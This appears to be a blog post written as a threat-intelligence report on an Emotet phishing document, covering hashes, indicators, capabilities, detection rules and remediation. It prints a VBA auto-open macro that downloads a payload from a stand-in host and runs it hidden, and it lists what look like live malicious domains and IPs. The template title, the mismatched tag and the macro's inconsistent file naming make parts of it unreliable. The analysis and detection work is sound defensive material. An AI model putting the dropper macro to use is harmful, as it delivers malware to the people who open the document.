+++
title = 'My Third Post'
date = 2025-03-21T14:44:24+07:00
draft = false
description = "This is a description"
image = "/images/virus.svg"
imageBig = "/images/imgBig.webp"
categories = ["General", "threat intel", "lumma"]
authors = ["Febrian Tisna"]
avatar = "/images/avatar.svg"
+++


## Executive Summary

Emotet is a sophisticated banking trojan that has evolved into a modular malware distribution platform. This analysis reveals its multi-stage infection process, advanced evasion techniques, and ability to deliver additional payloads like TrickBot and Ryuk ransomware. The sample shows significant improvements in anti-analysis capabilities compared to earlier variants.

**Threat Level**: Critical  
**Family**: Emotet  
**Aliases**: Heodo, Feodo  
**Discovered**: Initially 2014, this variant from January 2023  
**Platform**: Windows  

## Sample Information

| Attribute | Value |
|-----------|-------|
| File Name | invoice_29381.doc |
| File Size | 283 KB |
| MD5 | 5d2bfc7ce9f3d69c559daf9f0f95a8b7 |
| SHA1 | 7c086c09c2b8322d5f094a59c2d23dec18cfa1fc |
| SHA256 | a5b68ef45d76d647d80f3134d43c0aee3b099dae63aaa940af59cb7c9e01c847 |
| File Type | MS Word Document with Malicious Macros |
| Compilation Timestamp | N/A (Document) |

## Initial Analysis

### Distribution Method

This Emotet sample was distributed through a phishing email campaign with the subject line "Outstanding Invoice #29381". The email contained an attachment named "invoice_29381.doc" which prompts users to enable macros to view the content.

### Indicators of Compromise (IOCs)

- Files: 
  - %TEMP%\invoice_29381.doc
  - %APPDATA%\Microsoft\[random-string].exe
  - %SYSTEMROOT%\System32\Tasks\Microsoftupdate[random-number]
- Registry:
  - HKCU\Software\Microsoft\Office\[version]\Word\Security\AccessVBOM = 1
  - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\[TaskGUID]
- Network:
  - Multiple C2 domains (see IOC List section)
- Other:
  - Scheduled task creation for persistence
  - PowerShell obfuscated command execution

## Technical Analysis

### Capabilities

- Steals banking credentials and financial information
- Harvests email credentials 
- Exfiltrates contact lists for spreading via existing email threads
- Downloads and executes additional malware payloads
- Establishes persistence via registry and scheduled tasks
- Uses encrypted C2 communications

### Code Analysis

The malicious document contains VBA macros that execute when enabled by the user:

```vba
Sub AutoOpen()
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    
    myURL = "hxxp://compromised-server.com/payload.bin"
    
    xHttp.Open "GET", myURL, False
    xHttp.Send
    
    With bStrm
        .Type = 1
        .Open
        .write xHttp.responseBody
        .savetofile Environ("TEMP") & "\temp_" & RandomString(8) & ".exe", 2
    End With
    
    Shell Environ("TEMP") & "\temp_" & RandomString(8) & ".exe", vbHide
End Sub

Function RandomString(Length As Integer)
    Dim i As Integer, Temp As String
    For i = 1 To Length
        Temp = Temp & Chr(Int((90 - 65 + 1) * Rnd + 65))
    Next i
    RandomString = Temp
End Function
```

The macro downloads a binary payload from a compromised website and executes it. This first-stage loader then:

1. Decrypts and injects the main Emotet module into a legitimate Windows process
2. Uses API hooking to evade detection
3. Establishes persistence through a scheduled task

### Anti-Analysis Techniques

- Heavily obfuscated code with junk functions and string encryption
- Detects virtual machines by checking for VM-specific registry keys, files, and processes
- Employs timing checks to detect debugging environments
- Uses process injection to hide in legitimate Windows processes
- Implements anti-sandbox techniques including human interaction checks

### Network Communications

- Protocol: Custom over HTTP/HTTPS
- Encryption: Custom encryption using RC4 with dynamic keys
- C2 Infrastructure: Uses a tiered botnet architecture with multiple fallback servers
  - Primary C2 domains are rotated frequently
  - Communications include system information, task requests, and data exfiltration
  - Uses a domain generation algorithm (DGA) as a backup communication method

## Mitigation & Remediation

### Detection

**YARA Rule:**
```
rule Emotet_Doc_Macro_2023 {
    meta:
        description = "Detects Emotet malicious document with macros"
        author = "Beta Blue Gate"
        date = "2023-01-15"
        
    strings:
        $header = { D0 CF 11 E0 A1 B1 1A E1 }  // OLE document header
        $macro1 = "AutoOpen" ascii nocase
        $macro2 = "Document_Open" ascii nocase
        $download = "Microsoft.XMLHTTP" ascii nocase
        $download2 = "Adodb.Stream" ascii nocase
        $suspicious1 = "Shell" ascii nocase
        $suspicious2 = "Environ(" ascii nocase
        $suspicious3 = ".savetofile" ascii nocase
        
    condition:
        $header at 0 and
        (($macro1 or $macro2) and
        ($download or $download2) and
        2 of ($suspicious*))
}
```

**SIGMA Rule:**
```yaml
title: Emotet Document Macro Execution
id: 5a3293ac-5277-4413-8772-57c43b2f3cc3
status: experimental
description: Detects the execution pattern of Emotet document macros
author: Beta Blue Gate
date: 2023/01/15
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    Image|endswith: 
      - '\WINWORD.EXE'
      - '\excel.exe'
    CommandLine|contains: '/Automation'
  process_creation:
    EventID: 1
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\excel.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
  condition: selection and process_creation
falsepositives:
  - Legitimate macro usage with command execution
level: high
```

### Remediation Steps

1. Isolate affected systems from the network immediately
2. Remove persistence mechanisms:
   - Delete scheduled tasks associated with Emotet
   - Remove registry entries mentioned in IOCs
3. Clean infected files:
   - Delete malicious executables in %APPDATA% and %TEMP% directories
   - Remove malicious document from user's download folder/email
4. Scan system with updated antivirus and EDR tools
5. Reset all credentials accessed from the infected system
6. Monitor network traffic for C2 communication attempts
7. Implement email filtering to block malicious document attachments

## Conclusion

This Emotet variant demonstrates the continuing evolution of this threat, with enhanced anti-analysis techniques and a multi-stage infection process. Its ability to deliver secondary payloads makes it a significant threat to organizations, potentially leading to data theft, financial fraud, or ransomware infections. The modular nature of Emotet makes it adaptable and persistent, requiring comprehensive security measures for prevention and detection.

## References

- [CISA Alert AA20-280A: Emotet Malware](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a)
- [MITRE ATT&CK: Emotet](https://attack.mitre.org/software/S0367/)
- [Malware Analysis Report - Emotet Evolution 2023 Q1](https://example-security-blog.com/emotet-2023-q1)
- [Emotet Technical Deep-Dive](https://example-research-institute.org/emotet-analysis)

## IOC List

```
# File Hashes (SHA256)
a5b68ef45d76d647d80f3134d43c0aee3b099dae63aaa940af59cb7c9e01c847
e8c3a8b6e3763d81027aa35a1a6a8e0c13054c1a977aa719abf14bdd6f585d24
f1bff3d62ad2af7cbe5a5518618710a6f92a4ea3f0ec5df6258e528baa1d5978

# Domains
morrishillconstruction.com/wp-admin/js/57839/
ezlabsdirect.com/css/86743/
earlyyearsbooks.co.uk/wp-content/languages/94756/
bestcrosses.ru/cgi-bin/19275/
bmsautomation.com/wp-admin/css/87365/

# IPs
45.153.241[.]209
192.185.128[.]183
160.153.128[.]158
184.168.221[.]41
103.75.201[.]2

# YARA Rule
rule Emotet_Payload_2023 {
    meta:
        description = "Detects Emotet payload 2023 variant"
        author = "Beta Blue Gate"
        date = "2023-01-15"
    strings:
        $s1 = { 48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 56 48 83 EC 30 }
        $s2 = { 83 F9 22 0F 85 ?? ?? ?? ?? 45 33 C9 }
        $s3 = "GetCommandLineA"
        $s4 = "LoadLibraryA"
        $s5 = "GetProcAddress"
        $s6 = "VirtualAlloc"
        $s7 = "VirtualProtect"
    condition:
        uint16(0) == 0x5A4D and
        filesize < 500KB and
        $s1 and
        (all of ($s3, $s4, $s5, $s6, $s7)) and
        $s2
} 